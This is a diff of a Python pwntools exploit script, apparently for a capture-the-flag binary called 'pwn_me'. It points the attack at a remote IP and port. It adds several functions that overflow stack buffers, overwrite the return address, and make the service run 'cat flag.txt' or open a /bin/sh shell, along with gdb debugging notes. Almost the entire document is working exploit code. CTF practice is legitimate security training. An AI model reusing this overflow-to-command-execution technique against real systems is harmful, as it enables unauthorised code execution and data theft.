@@ -1,6 +1,7 @@
 from pwn import *
 
-p = process("./pwn_me")
+#p = process("./pwn_me")
+p = remote("64.227.23.177",1339)
 
 def initial_heap_overflow():
     name = b'B'*0x200
@@ -146,9 +147,101 @@ def percision_stack_smash():
     print(p.recv())
     input()
 
+def investigate_stack_run():
+    #name = b'\\bin\\sh' 
+    name = b'cat flag.txt' 
+    stack_buffer_1 = b'A'*0x244 + b'X'*8
+    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
+    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
+    p.recv()
+    p.sendline(b'push ' + stack_buffer_1)
+    p.recv()
+    p.sendline(b'name ' + name)
+    p.recv()
+    p.sendline(b'pop 1')
+    p.recv()
+    p.sendline(b'push ' + stack_buffer_2)
+    p.recv()
+    print('''DEBUG: 
+                b *stack_print+41 ; 
+            to see if it jumps to the read call in handle_stack_commands
+            Then
+                set $rdx = stack_run
+            To see what that function does
+            ''')
+    input()
+    #print("Go interactive?")
+    #input()
+    #print("Type: print; echo $$")
+    #p.interactive()
+    p.sendline(b'print')
+    print(p.recv())
+    print(p.recv())
+    input()
+
+def local_stack_run():
+    name = b'\\bin\\sh' 
+    stack_buffer_1 = b'A'*0x244 + b'X'*8
+    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
+    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
+    p.recv()
+    p.sendline(b'push ' + stack_buffer_1)
+    p.recv()
+    p.sendline(b'name ' + name)
+    p.recv()
+    p.sendline(b'pop 1')
+    p.recv()
+    p.sendline(b'push ' + stack_buffer_2)
+    p.recv()
+    p.sendline(b'print ')
+    print("Try: echo $$")
+    p.interactive()
+
+def local_cat_stack_run():
+    #name = b'\\bin\\sh' 
+    name = b'cat flag.txt' 
+    stack_buffer_1 = b'A'*0x244 + b'X'*8
+    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
+    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
+    p.recv()
+    p.sendline(b'push ' + stack_buffer_1)
+    p.recv()
+    p.sendline(b'name ' + name)
+    p.recv()
+    p.sendline(b'pop 1')
+    p.recv()
+    p.sendline(b'push ' + stack_buffer_2)
+    p.recv()
+    p.sendline(b'print')
+    print(p.recv())
+    print(p.recv())
+    
+def remote_cat_stack_run():
+    #name = b'\\bin\\sh' 
+    name = b'cat flag.txt' 
+    stack_buffer_1 = b'A'*0x244 + b'X'*8
+    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
+    stack_buffer_2 += b'\xc0\x19' #RIP if we call print
+    print(p.recv())
+    p.sendline(b'push ' + stack_buffer_1)
+    print(p.recv())
+    p.sendline(b'name ' + name)
+    print(p.recv())
+    p.sendline(b'pop 1')
+    print(p.recv())
+    p.sendline(b'push ' + stack_buffer_2)
+    p.recv()
+    p.sendline(b'print')
+    print(p.recv())
+    print(p.recv())
+
 if __name__=='__main__':
     #initial_heap_overflow()
     #first_name_overflow()
     #first_stack_smash()
     #cycle_stack_smash()
-    percision_stack_smash()
+    #percision_stack_smash()
+    #investigate_stack_run()
+    #local_stack_run()
+    #local_cat_stack_run()
+    remote_cat_stack_run()
